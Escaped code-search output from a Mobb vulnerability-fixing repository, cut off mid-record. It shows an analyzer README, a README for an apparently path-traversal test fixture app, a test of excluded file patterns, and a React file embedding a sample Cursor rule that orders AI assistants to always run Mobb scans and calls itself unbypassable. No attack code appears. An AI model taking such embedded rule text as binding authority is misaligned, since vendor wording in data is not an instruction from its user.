links:\\\\n\\\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\\\n\\\\n### \`semgrep_rules\` folder\\\\n\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"# Analyzer\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"Analyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"## Useful commands\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"- \`make test\` or \`make test-watch\` to run all test.\\",\\"lineNumber\\":7},{\\"text\\":\\"- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\",\\"lineNumber\\":8},{\\"text\\":\\"- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\",\\"lineNumber\\":9},{\\"text\\":\\"- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\",\\"lineNumber\\":10},{\\"lineNumber\\":11},{\\"text\\":\\"## \`analyzer/fixes\` folder structure\\",\\"lineNumber\\":12},{\\"lineNumber\\":13},{\\"text\\":\\"All logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\",\\"lineNumber\\":14},{\\"lineNumber\\":15},{\\"text\\":\\"In each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\",\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"### \`types.py\`\\",\\"lineNumber\\":18},{\\"lineNumber\\":19},{\\"text\\":\\"This file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\",\\"lineNumber\\":20},{\\"lineNumber\\":21},{\\"text\\":\\"It usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\",\\"lineNumber\\":22},{\\"lineNumber\\":23},{\\"text\\":\\"The \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\",\\"lineNumber\\":24},{\\"lineNumber\\":25},{\\"text\\":\\"### \`parser.py\`\\",\\"lineNumber\\":26},{\\"lineNumber\\":27},{\\"text\\":\\"\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\",\\"lineNumber\\":28},{\\"lineNumber\\":29},{\\"text\\":\\"This is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\",\\"lineNumber\\":30},{\\"lineNumber\\":31},{\\"text\\":\\"### \`treesitter_rules\` folder\\",\\"lineNumber\\":32},{\\"lineNumber\\":33},{\\"text\\":\\"This folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\",\\"lineNumber\\":34},{\\"lineNumber\\":35},{\\"text\\":\\"The rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"text\\":\\"Useful links:\\",\\"lineNumber\\":38},{\\"lineNumber\\":39},{\\"text\\":\\"- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\",\\"lineNumber\\":40},{\\"text\\":\\"- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\",\\"lineNumber\\":41},{\\"lineNumber\\":42},{\\"text\\":\\"### \`semgrep_rules\` folder\\",\\"lineNumber\\":43},{\\"lineNumber\\":44},{\\"text\\":\\"Contains \`yml\` rules used by Semgrep. The rule file name should be unique.\\",\\"lineNumber\\":45}]},\\"score\\":0.2902885973453522},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":76},\\"endPosition\\":{\\"line\\":160}},\\"contents\\":\\"- **Response**: JSON with file metadata (size, last modified)\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl \\\\\\"http://localhost:8080/api/files/info?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n## Configuration\\\\n\\\\nThe application can be configured through \`src/main/resources/application.properties\`:\\\\n\\\\n- \`server.port\`: Server port (default: 8080)\\\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\\\n\\\\n## File Storage\\\\n\\\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\\\n\\\\n## Security Considerations\\\\n\\\\nThis is a simple demo application. For production use, consider implementing:\\\\n\\\\n- Authentication and authorization\\\\n- File type validation\\\\n- Virus scanning\\\\n- Rate limiting\\\\n- Secure file storage (e.g., cloud storage)\\\\n- Input validation and sanitization\\\\n\\\\n## Error Handling\\\\n\\\\nThe API returns appropriate HTTP status codes:\\\\n\\\\n- \`200 OK\`: Successful operation\\\\n- \`400 Bad Request\`: Invalid input or file not found\\\\n- \`404 Not Found\`: File not found\\\\n- \`500 Internal Server Error\`: Server error\\\\n\\\\n## Development\\\\n\\\\n### Project Structure\\\\n\\\\n\`\`\`\\\\nsrc/\\\\n├── main/\\\\n│   ├── java/\\\\n│   │   └── com/example/fileapi/\\\\n│   │       ├── FileApiApplication.java\\\\n│   │       ├── controller/\\\\n│   │       │   └── FileController.java\\\\n│   │       └── service/\\\\n│   │           └── FileService.java\\\\n│   └── resources/\\\\n│       ├── application.properties\\\\n│       └── static/\\\\n│           └── index.html\\\\n└── test/\\\\n    └── java/\\\\n        └── com/example/fileapi/\\\\n            └── FileApiApplicationTests.java\\\\n\`\`\`\\\\n\\\\n### Running Tests\\\\n\\\\n\`\`\`bash\\\\nmvn test\\\\n\`\`\`\\\\n\\\\n### Building JAR\\\\n\\\\n\`\`\`bash\\\\nmvn clean package\\\\n\`\`\`\\\\n\\\\nThe executable JAR will be created in the \`target/\` directory.\\\\n\\\\n## License\\\\n\\\\n\\",\\"originalContents\\":\\"- **Response**: JSON with file metadata (size, last modified)\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl \\\\\\"http://localhost:8080/api/files/info?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n## Configuration\\\\n\\\\nThe application can be configured through \`src/main/resources/application.properties\`:\\\\n\\\\n- \`server.port\`: Server port (default: 8080)\\\\n- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\\\n- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\\\n\\\\n## File Storage\\\\n\\\\nFiles are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\\\n\\\\n## Security Considerations\\\\n\\\\nThis is a simple demo application. For production use, consider implementing:\\\\n\\\\n- Authentication and authorization\\\\n- File type validation\\\\n- Virus scanning\\\\n- Rate limiting\\\\n- Secure file storage (e.g., cloud storage)\\\\n- Input validation and sanitization\\\\n\\\\n## Error Handling\\\\n\\\\nThe API returns appropriate HTTP status codes:\\\\n\\\\n- \`200 OK\`: Successful operation\\\\n- \`400 Bad Request\`: Invalid input or file not found\\\\n- \`404 Not Found\`: File not found\\\\n- \`500 Internal Server Error\`: Server error\\\\n\\\\n## Development\\\\n\\\\n### Project Structure\\\\n\\\\n\`\`\`\\\\nsrc/\\\\n├── main/\\\\n│   ├── java/\\\\n│   │   └── com/example/fileapi/\\\\n│   │       ├── FileApiApplication.java\\\\n│   │       ├── controller/\\\\n│   │       │   └── FileController.java\\\\n│   │       └── service/\\\\n│   │           └── FileService.java\\\\n│   └── resources/\\\\n│       ├── application.properties\\\\n│       └── static/\\\\n│           └── index.html\\\\n└── test/\\\\n    └── java/\\\\n        └── com/example/fileapi/\\\\n            └── FileApiApplicationTests.java\\\\n\`\`\`\\\\n\\\\n### Running Tests\\\\n\\\\n\`\`\`bash\\\\nmvn test\\\\n\`\`\`\\\\n\\\\n### Building JAR\\\\n\\\\n\`\`\`bash\\\\nmvn clean package\\\\n\`\`\`\\\\n\\\\nThe executable JAR will be created in the \`target/\` directory.\\\\n\\\\n## License\\\\n\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":77},{\\"lineNumber\\":78},{\\"text\\":\\"### Get File Information\\",\\"lineNumber\\":79},{\\"text\\":\\"- **URL**: \`GET /api/files/info?filename={filename}\`\\",\\"lineNumber\\":80},{\\"text\\":\\"- **Response**: JSON with file metadata (size, last modified)\\",\\"lineNumber\\":81},{\\"lineNumber\\":82},{\\"text\\":\\"**Example using curl:**\\",\\"lineNumber\\":83},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":84},{\\"text\\":\\"curl \\\\\\"http://localhost:8080/api/files/info?filename={filename}\\\\\\"\\",\\"lineNumber\\":85},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":86},{\\"lineNumber\\":87},{\\"text\\":\\"## Configuration\\",\\"lineNumber\\":88},{\\"lineNumber\\":89},{\\"text\\":\\"The application can be configured through \`src/main/resources/application.properties\`:\\",\\"lineNumber\\":90},{\\"lineNumber\\":91},{\\"text\\":\\"- \`server.port\`: Server port (default: 8080)\\",\\"lineNumber\\":92},{\\"text\\":\\"- \`spring.servlet.multipart.max-file-size\`: Maximum file size (default: 10MB)\\",\\"lineNumber\\":93},{\\"text\\":\\"- \`spring.servlet.multipart.max-request-size\`: Maximum request size (default: 10MB)\\",\\"lineNumber\\":94},{\\"lineNumber\\":95},{\\"text\\":\\"## File Storage\\",\\"lineNumber\\":96},{\\"lineNumber\\":97},{\\"text\\":\\"Files are stored in the \`uploads/\` directory in the application's working directory. Each file is given a unique UUID-based filename to prevent conflicts.\\",\\"lineNumber\\":98},{\\"lineNumber\\":99},{\\"text\\":\\"## Security Considerations\\",\\"lineNumber\\":100},{\\"lineNumber\\":101},{\\"text\\":\\"This is a simple demo application. For production use, consider implementing:\\",\\"lineNumber\\":102},{\\"lineNumber\\":103},{\\"text\\":\\"- Authentication and authorization\\",\\"lineNumber\\":104},{\\"text\\":\\"- File type validation\\",\\"lineNumber\\":105},{\\"text\\":\\"- Virus scanning\\",\\"lineNumber\\":106},{\\"text\\":\\"- Rate limiting\\",\\"lineNumber\\":107},{\\"text\\":\\"- Secure file storage (e.g., cloud storage)\\",\\"lineNumber\\":108},{\\"text\\":\\"- Input validation and sanitization\\",\\"lineNumber\\":109},{\\"lineNumber\\":110},{\\"text\\":\\"## Error Handling\\",\\"lineNumber\\":111},{\\"lineNumber\\":112},{\\"text\\":\\"The API returns appropriate HTTP status codes:\\",\\"lineNumber\\":113},{\\"lineNumber\\":114},{\\"text\\":\\"- \`200 OK\`: Successful operation\\",\\"lineNumber\\":115},{\\"text\\":\\"- \`400 Bad Request\`: Invalid input or file not found\\",\\"lineNumber\\":116},{\\"text\\":\\"- \`404 Not Found\`: File not found\\",\\"lineNumber\\":117},{\\"text\\":\\"- \`500 Internal Server Error\`: Server error\\",\\"lineNumber\\":118},{\\"lineNumber\\":119},{\\"text\\":\\"## Development\\",\\"lineNumber\\":120},{\\"lineNumber\\":121},{\\"text\\":\\"### Project Structure\\",\\"lineNumber\\":122},{\\"lineNumber\\":123},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":124},{\\"text\\":\\"src/\\",\\"lineNumber\\":125},{\\"text\\":\\"├── main/\\",\\"lineNumber\\":126},{\\"text\\":\\"│   ├── java/\\",\\"lineNumber\\":127},{\\"text\\":\\"│   │   └── com/example/fileapi/\\",\\"lineNumber\\":128},{\\"text\\":\\"│   │       ├── FileApiApplication.java\\",\\"lineNumber\\":129},{\\"text\\":\\"│   │       ├── controller/\\",\\"lineNumber\\":130},{\\"text\\":\\"│   │       │   └── FileController.java\\",\\"lineNumber\\":131},{\\"text\\":\\"│   │       └── service/\\",\\"lineNumber\\":132},{\\"text\\":\\"│   │           └── FileService.java\\",\\"lineNumber\\":133},{\\"text\\":\\"│   └── resources/\\",\\"lineNumber\\":134},{\\"text\\":\\"│       ├── application.properties\\",\\"lineNumber\\":135},{\\"text\\":\\"│       └── static/\\",\\"lineNumber\\":136},{\\"text\\":\\"│           └── index.html\\",\\"lineNumber\\":137},{\\"text\\":\\"└── test/\\",\\"lineNumber\\":138},{\\"text\\":\\"    └── java/\\",\\"lineNumber\\":139},{\\"text\\":\\"        └── com/example/fileapi/\\",\\"lineNumber\\":140},{\\"text\\":\\"            └── FileApiApplicationTests.java\\",\\"lineNumber\\":141},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":142},{\\"lineNumber\\":143},{\\"text\\":\\"### Running Tests\\",\\"lineNumber\\":144},{\\"lineNumber\\":145},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":146},{\\"text\\":\\"mvn test\\",\\"lineNumber\\":147},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":148},{\\"lineNumber\\":149},{\\"text\\":\\"### Building JAR\\",\\"lineNumber\\":150},{\\"lineNumber\\":151},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":152},{\\"text\\":\\"mvn clean package\\",\\"lineNumber\\":153},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":154},{\\"lineNumber\\":155},{\\"text\\":\\"The executable JAR will be created in the \`target/\` directory.\\",\\"lineNumber\\":156},{\\"lineNumber\\":157},{\\"text\\":\\"## License\\",\\"lineNumber\\":158},{\\"lineNumber\\":159},{\\"text\\":\\"This project is open source and available under the MIT License. \\",\\"lineNumber\\":160}]},\\"score\\":0.288938045501709},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"clients/cli/__tests__/mcp/fileUtils.unit.test.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":16,\\"column\\":3},\\"endPosition\\":{\\"line\\":1261,\\"column\\":1}},\\"contents\\":\\"\\\\n...\\\\ndescribe('FileUtils', () => {\\\\n  ...\\\\n  describe('isExcludedFileType', () => {\\\\n\\\\n\\\\n    ...\\\\n\\\\n\\\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\\\n      const excludedFiles = [\\\\n        // Snapshot and environment files\\\\n        'test.snap',\\\\n        'secrets.env.vault',\\\\n        '.env',\\\\n        // Configuration formats not supported for analysis\\\\n        'config.toml',\\\\n        'app.ini',\\\\n        'server.conf',\\\\n        'settings.config',\\\\n        // Documentation files\\\\n        'README.md',\\\\n        'notes.txt',\\\\n        'guide.rst',\\\\n        'manual.adoc',\\\\n        // Lock files (except important project ones handled separately)\\\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\\\n        // Image and media files\\\\n        'logo.png',\\\\n        'photo.jpg',\\\\n        'image.jpeg',\\\\n        'animation.gif',\\\\n        'favicon.ico',\\\\n        'banner.webp',\\\\n        'texture.bmp',\\\\n        'print.tiff',\\\\n        // Font files\\\\n        'font.ttf',\\\\n        'typeface.otf',\\\\n        'web.woff',\\\\n        'modern.woff2',\\\\n        'legacy.eot',\\\\n        // Archive files\\\\n        'backup.zip',\\\\n        'archive.tar',\\\\n        'compressed.gz',\\\\n        'files.rar',\\\\n        'data.7z',\\\\n        // Log and database files\\\\n        'app.log',\\\\n        'data.db',\\\\n        'cache.sqlite',\\\\n        'schema.sql',\\\\n        // Certificate and key files\\\\n        'cert.pem',\\\\n        'ssl.crt',\\\\n        'private.key',\\\\n        'identity.p12',\\\\n        'cert.pfx',\\\\n        // Editor and system files\\\\n        '.editorconfig',\\\\n        'project.sublime-project',\\\\n        'workspace.sublime-workspace',\\\\n        '.DS_Store',\\\\n        'Thumbs.db',\\\\n        // Coverage and build artifacts\\\\n        'coverage.lcov',\\\\n        'app.exe',\\\\n        'library.dll',\\\\n        'libmath.so',\\\\n        'framework.dylib',\\\\n        'Main.class',\\\\n        'module.pyc',\\\\n        'cache.pyo',\\\\n        'object.o',\\\\n        'binary.obj',\\\\n        // Minified and bundled files (even with supported extensions)\\\\n        'jquery.min.js',\\\\n        'bootstrap.min.css'\\",\\"originalContents\\":\\"\\\\n\\\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\\\n      const excludedFiles = [\\\\n        // Snapshot and environment files\\\\n        'test.snap',\\\\n        'secrets.env.vault',\\\\n        '.env',\\\\n        // Configuration formats not supported for analysis\\\\n        'config.toml',\\\\n        'app.ini',\\\\n        'server.conf',\\\\n        'settings.config',\\\\n        // Documentation files\\\\n        'README.md',\\\\n        'notes.txt',\\\\n        'guide.rst',\\\\n        'manual.adoc',\\\\n        // Lock files (except important project ones handled separately)\\\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\\\n        // Image and media files\\\\n        'logo.png',\\\\n        'photo.jpg',\\\\n        'image.jpeg',\\\\n        'animation.gif',\\\\n        'favicon.ico',\\\\n        'banner.webp',\\\\n        'texture.bmp',\\\\n        'print.tiff',\\\\n        // Font files\\\\n        'font.ttf',\\\\n        'typeface.otf',\\\\n        'web.woff',\\\\n        'modern.woff2',\\\\n        'legacy.eot',\\\\n        // Archive files\\\\n        'backup.zip',\\\\n        'archive.tar',\\\\n        'compressed.gz',\\\\n        'files.rar',\\\\n        'data.7z',\\\\n        // Log and database files\\\\n        'app.log',\\\\n        'data.db',\\\\n        'cache.sqlite',\\\\n        'schema.sql',\\\\n        // Certificate and key files\\\\n        'cert.pem',\\\\n        'ssl.crt',\\\\n        'private.key',\\\\n        'identity.p12',\\\\n        'cert.pfx',\\\\n        // Editor and system files\\\\n        '.editorconfig',\\\\n        'project.sublime-project',\\\\n        'workspace.sublime-workspace',\\\\n        '.DS_Store',\\\\n        'Thumbs.db',\\\\n        // Coverage and build artifacts\\\\n        'coverage.lcov',\\\\n        'app.exe',\\\\n        'library.dll',\\\\n        'libmath.so',\\\\n        'framework.dylib',\\\\n        'Main.class',\\\\n        'module.pyc',\\\\n        'cache.pyo',\\\\n        'object.o',\\\\n        'binary.obj',\\\\n        // Minified and bundled files (even with supported extensions)\\\\n        'jquery.min.js',\\\\n        'bootstrap.min.css'\\",\\"detailedLines\\":[{\\"text\\":\\"describe('FileUtils', () => {\\",\\"lineNumber\\":19},{\\"text\\":\\"  let mockRepo: MockRepo\\",\\"lineNumber\\":20},{\\"lineNumber\\":29},{\\"lineNumber\\":30},{\\"text\\":\\"  describe('isExcludedFileType', () => {\\",\\"lineNumber\\":31},{\\"text\\":\\"    it\\",\\"lineNumber\\":32},{\\"lineNumber\\":36},{\\"text\\":\\"() => {\\",\\"lineNumber\\":76},{\\"text\\":\\" {\\",\\"lineNumber\\":207},{\\"text\\":\\"        expect(FileUtils.isExcludedFileType(file)).toBe(false)\\",\\"lineNumber\\":208},{\\"text\\":\\"      }\\",\\"lineNumber\\":209},{\\"text\\":\\"    })\\",\\"lineNumber\\":210},{\\"lineNumber\\":211},{\\"text\\":\\"    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\",\\"lineNumber\\":212},{\\"text\\":\\"      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\",\\"lineNumber\\":213},{\\"text\\":\\"      const excludedFiles = [\\",\\"lineNumber\\":214},{\\"text\\":\\"        // Snapshot and environment files\\",\\"lineNumber\\":215},{\\"text\\":\\"        'test.snap',\\",\\"lineNumber\\":216},{\\"text\\":\\"        'secrets.env.vault',\\",\\"lineNumber\\":217},{\\"text\\":\\"        '.env',\\",\\"lineNumber\\":218},{\\"text\\":\\"        // Configuration formats not supported for analysis\\",\\"lineNumber\\":219},{\\"text\\":\\"        'config.toml',\\",\\"lineNumber\\":220},{\\"text\\":\\"        'app.ini',\\",\\"lineNumber\\":221},{\\"text\\":\\"        'server.conf',\\",\\"lineNumber\\":222},{\\"text\\":\\"        'settings.config',\\",\\"lineNumber\\":223},{\\"text\\":\\"        // Documentation files\\",\\"lineNumber\\":224},{\\"text\\":\\"        'README.md',\\",\\"lineNumber\\":225},{\\"text\\":\\"        'notes.txt',\\",\\"lineNumber\\":226},{\\"text\\":\\"        'guide.rst',\\",\\"lineNumber\\":227},{\\"text\\":\\"        'manual.adoc',\\",\\"lineNumber\\":228},{\\"text\\":\\"        // Lock files (except important project ones handled separately)\\",\\"lineNumber\\":229},{\\"text\\":\\"        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\",\\"lineNumber\\":230},{\\"text\\":\\"        // Image and media files\\",\\"lineNumber\\":231},{\\"text\\":\\"        'logo.png',\\",\\"lineNumber\\":232},{\\"text\\":\\"        'photo.jpg',\\",\\"lineNumber\\":233},{\\"text\\":\\"        'image.jpeg',\\",\\"lineNumber\\":234},{\\"text\\":\\"        'animation.gif',\\",\\"lineNumber\\":235},{\\"text\\":\\"        'favicon.ico',\\",\\"lineNumber\\":236},{\\"text\\":\\"        'banner.webp',\\",\\"lineNumber\\":237},{\\"text\\":\\"        'texture.bmp',\\",\\"lineNumber\\":238},{\\"text\\":\\"        'print.tiff',\\",\\"lineNumber\\":239},{\\"text\\":\\"        // Font files\\",\\"lineNumber\\":240},{\\"text\\":\\"        'font.ttf',\\",\\"lineNumber\\":241},{\\"text\\":\\"        'typeface.otf',\\",\\"lineNumber\\":242},{\\"text\\":\\"        'web.woff',\\",\\"lineNumber\\":243},{\\"text\\":\\"        'modern.woff2',\\",\\"lineNumber\\":244},{\\"text\\":\\"        'legacy.eot',\\",\\"lineNumber\\":245},{\\"text\\":\\"        // Archive files\\",\\"lineNumber\\":246},{\\"text\\":\\"        'backup.zip',\\",\\"lineNumber\\":247},{\\"text\\":\\"        'archive.tar',\\",\\"lineNumber\\":248},{\\"text\\":\\"        'compressed.gz',\\",\\"lineNumber\\":249},{\\"text\\":\\"        'files.rar',\\",\\"lineNumber\\":250},{\\"text\\":\\"        'data.7z',\\",\\"lineNumber\\":251},{\\"text\\":\\"        // Log and database files\\",\\"lineNumber\\":252},{\\"text\\":\\"        'app.log',\\",\\"lineNumber\\":253},{\\"text\\":\\"        'data.db',\\",\\"lineNumber\\":254},{\\"text\\":\\"        'cache.sqlite',\\",\\"lineNumber\\":255},{\\"text\\":\\"        'schema.sql',\\",\\"lineNumber\\":256},{\\"text\\":\\"        // Certificate and key files\\",\\"lineNumber\\":257},{\\"text\\":\\"        'cert.pem',\\",\\"lineNumber\\":258},{\\"text\\":\\"        'ssl.crt',\\",\\"lineNumber\\":259},{\\"text\\":\\"        'private.key',\\",\\"lineNumber\\":260},{\\"text\\":\\"        'identity.p12',\\",\\"lineNumber\\":261},{\\"text\\":\\"        'cert.pfx',\\",\\"lineNumber\\":262},{\\"text\\":\\"        // Editor and system files\\",\\"lineNumber\\":263},{\\"text\\":\\"        '.editorconfig',\\",\\"lineNumber\\":264},{\\"text\\":\\"        'project.sublime-project',\\",\\"lineNumber\\":265},{\\"text\\":\\"        'workspace.sublime-workspace',\\",\\"lineNumber\\":266},{\\"text\\":\\"        '.DS_Store',\\",\\"lineNumber\\":267},{\\"text\\":\\"        'Thumbs.db',\\",\\"lineNumber\\":268},{\\"text\\":\\"        // Coverage and build artifacts\\",\\"lineNumber\\":269},{\\"text\\":\\"        'coverage.lcov',\\",\\"lineNumber\\":270},{\\"text\\":\\"        'app.exe',\\",\\"lineNumber\\":271},{\\"text\\":\\"        'library.dll',\\",\\"lineNumber\\":272},{\\"text\\":\\"        'libmath.so',\\",\\"lineNumber\\":273},{\\"text\\":\\"        'framework.dylib',\\",\\"lineNumber\\":274},{\\"text\\":\\"        'Main.class',\\",\\"lineNumber\\":275},{\\"text\\":\\"        'module.pyc',\\",\\"lineNumber\\":276},{\\"text\\":\\"        'cache.pyo',\\",\\"lineNumber\\":277},{\\"text\\":\\"        'object.o',\\",\\"lineNumber\\":278},{\\"text\\":\\"        'binary.obj',\\",\\"lineNumber\\":279},{\\"text\\":\\"        // Minified and bundled files (even with supported extensions)\\",\\"lineNumber\\":280},{\\"text\\":\\"        'jquery.min.js',\\",\\"lineNumber\\":281},{\\"text\\":\\"        'bootstrap.min.css',\\",\\"lineNumber\\":282},{\\"text\\":\\"        'index.min.html'\\",\\"lineNumber\\":283},{\\"text\\":\\",\\",\\"lineNumber\\":371},{\\"text\\":\\"      ]\\",\\"lineNumber\\":372},{\\"text\\":\\"    }\\",\\"lineNumber\\":377},{\\"text\\":\\"  }\\",\\"lineNumber\\":520},{\\"text\\":\\"}\\",\\"lineNumber\\":1262}]},\\"score\\":0.2807697057723999},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":153,\\"column\\":1}},\\"contents\\":\\"import { useToast } from '@mobb/app/context/toast'\\\\nimport {\\\\n  Button,\\\\n  Dialog,\\\\n  Flex,\\\\n  keyframes,\\\\n  RawButton,\\\\n  styled,\\\\n  SvgCross,\\\\n  Text,\\\\n} from '@mobb/components'\\\\nimport { useState } from 'react'\\\\nimport { useSearchParams } from 'react-router-dom'\\\\n\\\\nconst sampleRule = \`---\\\\nalwaysApply: true\\\\n---\\\\n# Security Rules for Mobb Vulnerability Scanning\\\\n## MANDATORY: Mobb Scan Protocol\\\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\\\\\` tool to scan the new/modified code\\\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\\\\\`.cursor/rules/\\\\\\\\\` to prevent the vulnerability type from recurring\\\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\\\n## Rule Addition Protocol\\\\nWhen Mobb produces a fix:\\\\n- Extract the vulnerability type (e.g., \\\\\\"Command Injection\\\\\\", \\\\\\"SQL Injection\\\\\\", \\\\\\"XSS\\\\\\")\\\\n- Create a generic prevention rule for that vulnerability type\\\\n- **If rule file exists**: Add new information to the existing \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` file\\\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` (e.g., \\\\\\\\\`command-injection.mdc\\\\\\\\\`)\\\\n- Add the rule with clear, actionable guidance and \\\\\\\\\`alwaysApply: true\\\\\\\\\`\\\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\\\n- Update the main security.mdc to reference the rule file (if it's new)\\\\n## Active Security Rules\\\\n## Enforcement\\\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\\\n- Team members should verify that security scans are run before code reviews\`\\",\\"originalContents\\":\\"import { useToast } from '@mobb/app/context/toast'\\\\nimport {\\\\n  Button,\\\\n  Dialog,\\\\n  Flex,\\\\n  keyframes,\\\\n  RawButton,\\\\n  styled,\\\\n  SvgCross,\\\\n  Text,\\\\n} from '@mobb/components'\\\\nimport { useState } from 'react'\\\\nimport { useSearchParams } from 'react-router-dom'\\\\n\\\\nconst sampleRule = \`---\\\\nalwaysApply: true\\\\n---\\\\n# Security Rules for Mobb Vulnerability Scanning\\\\n## MANDATORY: Mobb Scan Protocol\\\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\\\\\` tool to scan the new/modified code\\\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\\\\\`.cursor/rules/\\\\\\\\\` to prevent the vulnerability type from recurring\\\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\\\n## Rule Addition Protocol\\\\nWhen Mobb produces a fix:\\\\n- Extract the vulnerability type (e.g., \\\\\\"Command Injection\\\\\\", \\\\\\"SQL Injection\\\\\\", \\\\\\"XSS\\\\\\")\\\\n- Create a generic prevention rule for that vulnerability type\\\\n- **If rule file exists**: Add new information to the existing \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` file\\\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\\\\\` (e.g., \\\\\\\\\`command-injection.mdc\\\\\\\\\`)\\\\n- Add the rule with clear, actionable guidance and \\\\\\\\\`alwaysApply: true\\\\\\\\\`\\\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\\\n- Update the main security.mdc to reference the rule file (if it's new)\\\\n## Active Security Rules\\\\n## Enforcement\\\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\\\n- Team members should verify that security scans are run before code reviews\`\\",\\"detailedLines\\":[{\\"text\\":\\"import { useToast } from '@mobb/app/context/toast'\\",\\"lineNumber\\":1},{\\"text\\":\\"import {\\",\\"lineNumber\\":2},{\\"text\\":\\"  Button,\\",\\"lineNumber\\":3},{\\"text\\":\\"  Dialog,\\",\\"lineNumber\\":4},{\\"text\\":\\"  Flex,\\",\\"lineNumber\\":5},{\\"text\\":\\"  keyframes,\\",\\"lineNumber\\":6},{\\"text\\":\\"  RawButton,\\",\\"lineNumber\\":7},{\\"text\\":\\"  styled,\\",\\"lineNumber\\":8},{\\"text\\":\\"  SvgCross,\\",\\"lineNumber\\":9},{\\"text\\":\\"  Text,\\",\\"lineNumber\\":10},{\\"text\\":\\"} from 